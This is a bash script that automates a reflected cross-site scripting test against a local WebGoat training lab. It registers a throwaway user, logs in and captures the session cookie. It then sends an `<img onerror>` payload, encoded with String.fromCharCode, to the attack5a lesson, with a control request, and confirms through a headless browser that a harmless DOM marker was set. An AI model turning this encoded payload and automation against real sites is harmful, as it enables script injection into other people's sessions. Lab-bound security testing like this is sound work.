#!/usr/bin/env bash
set -Eeuo pipefail
WG="${WG:-http://<lab-ip>:8080/WebGoat}"
RUN_ID="webgoat_browser_runtime_xss_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/xss" "$OUT/browser"
J="$OUT/http/cookies.txt"
OBS="$OUT/observations.jsonl"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o /dev/null -w '%{http_code}' --max-time 8 "$1" 2>/dev/null || echo 000; }
PRE=$(status "$WG/login")
json_obs category=health name=pre_webgoat_login status="$PRE" target="$WG"
[ "$PRE" = "200" ] || { echo "webgoat_unhealthy pre=$PRE" >&2; exit 2; }
U="xss$(date -u +%H%M%S)"
P="webgoat"
curl -sS -m 10 -c "$J" -o "$OUT/http/registration.html" "$WG/registration"
REG=$(curl -sS -m 12 -b "$J" -c "$J" -o "$OUT/http/register_post.html" -w '%{http_code}' -X POST "$WG/register.mvc" --data-urlencode "username=$U" --data-urlencode "password=$P" --data-urlencode "matchingPassword=$P" --data-urlencode 'agree=agree' || echo 000)
LOGIN=$(curl -sS -m 12 -b "$J" -c "$J" -o "$OUT/http/start.html" -w '%{http_code}' -X POST "$WG/login" --data-urlencode "username=$U" --data-urlencode "password=$P" || echo 000)
LESSON=$(curl -sS -m 12 -b "$J" -c "$J" -o "$OUT/http/CrossSiteScripting.lesson.html" -w '%{http_code}' "$WG/CrossSiteScripting.lesson" || echo 000)
json_obs category=auth register_status="$REG" login_status="$LOGIN" lesson_status="$LESSON" user="$U"
JSESSIONID=$(python3 - "$J" <<'PY'
import sys
val=''
for line in open(sys.argv[1], encoding='utf-8', errors='ignore'):
    if not line.strip() or line.startswith('# '):
        continue
    # curl stores HttpOnly cookies with a #HttpOnly_ domain prefix; keep those lines.
    parts=line.rstrip('\n').split('\t')
    if len(parts) >= 7 and parts[5] == 'JSESSIONID':
        val=parts[6]
print(val)
PY
)
[ -n "$JSESSIONID" ] || { echo "missing_jsessionid" >&2; exit 3; }
MARKER="WG_XSS_RUNTIME_${RUN_ID}"
PAYLOAD=$(python3 - "$MARKER" <<'PY'
import sys
marker=sys.argv[1]
def codes(s):
    return ','.join(str(ord(c)) for c in s)
print(
    '<img src=x onerror='
    f'document.body.setAttribute(String.fromCharCode({codes("data-xss")}),String.fromCharCode({codes(marker)}));'
    f'document.body.setAttribute(String.fromCharCode({codes("data-origin")}),location.origin);'
    f'document.body.setAttribute(String.fromCharCode({codes("data-path")}),location.pathname);'
    '>'
)
PY
)
printf '%s\n' "$PAYLOAD" > "$OUT/xss/payload.html"
URLS_JSON=$(python3 - "$WG" "$MARKER" "$PAYLOAD" "$OUT" <<'PY'
import json, sys, urllib.parse, pathlib
wg, marker, payload, out = sys.argv[1:]
outp=pathlib.Path(out)
params={
    'QTY1':'1','QTY2':'1','QTY3':'1','QTY4':'1',
    'field1': payload,
    'field2': '111',
    'field3': 'webgoat',
}
url=wg + '/CrossSiteScripting/attack5a?' + urllib.parse.urlencode(params)
control_params=dict(params)
control_params['field1']=marker + '_REFLECT_ONLY_CONTROL'
control_url=wg + '/CrossSiteScripting/attack5a?' + urllib.parse.urlencode(control_params)
(outp/'xss'/'xss_url.txt').write_text(url, encoding='utf-8')
(outp/'xss'/'control_url.txt').write_text(control_url, encoding='utf-8')
print(json.dumps({'url': url, 'control_url': control_url}))
PY
)
XSS_URL=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["url"])' "$URLS_JSON")
CONTROL_URL=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["control_url"])' "$URLS_JSON")
python3 /mnt/hacking/scripts/labs/cdp_runtime_xss.py \
  --cookie-value "$JSESSIONID" \
  --cookie-url "$WG" \
  --xss-url "$XSS_URL" \
  --control-url "$CONTROL_URL" \
  --marker "$MARKER" \
  --out "$OUT/xss" > "$OUT/xss/cdp_stdout.json"
cp "$OUT/xss/xss_page.png" "$OUT/browser/xss_page.png" 2>/dev/null || true
RUNTIME_MARKER=$(python3 - "$OUT/xss/browser_result.json" "$MARKER" <<'PY'
import json,sys
r=json.load(open(sys.argv[1])); marker=sys.argv[2]
attrs=r.get('attrs') or {}; control=r.get('control_attrs') or {}
print('yes' if attrs.get('xss') == marker and attrs.get('origin') == 'http://<lab-ip>:8080' and attrs.get('path') == '/WebGoat/CrossSiteScripting/attack5a' and not control.get('xss') else 'no')
PY
)
POST=$(status "$WG/login")
json_obs category=xss target="$WG" marker="$MARKER" runtime_marker="$RUNTIME_MARKER" result="$OUT/xss/browser_result.json" dom="$OUT/xss/dom.html" control_dom="$OUT/xss/control_dom.html" screenshot="$OUT/browser/xss_page.png"
json_obs category=health name=post_webgoat_login status="$POST" target="$WG"
cat > "$OUT/summary.md" <<EOF
# WebGoat Browser Runtime XSS Wave 1

target: $WG
pre_health: $PRE
post_health: $POST
register_status: $REG
login_status: $LOGIN
lesson_status: $LESSON
marker: $MARKER
runtime_marker: $RUNTIME_MARKER

## Evidence

- browser_result: $OUT/xss/browser_result.json
- dom: $OUT/xss/dom.html
- control_dom: $OUT/xss/control_dom.html
- screenshot: $OUT/browser/xss_page.png
- observations: $OBS

## Boundary

Local WebGoat lab only; throwaway WebGoat user; safe DOM marker mutation only; no cookie/token theft, no exfiltration, no external callback, no persistence, no public target.
EOF
echo "$OUT"
[ "$RUNTIME_MARKER" = yes ] && [ "$POST" = "200" ]
